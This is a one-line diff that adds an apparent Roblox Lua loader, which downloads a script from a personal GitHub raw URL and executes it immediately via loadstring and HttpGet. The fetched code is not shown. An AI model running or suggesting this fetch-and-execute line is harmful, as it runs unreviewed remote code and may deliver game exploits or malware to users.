@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jaokerturr/eeeee/refs/heads/main/nas.lua"))()
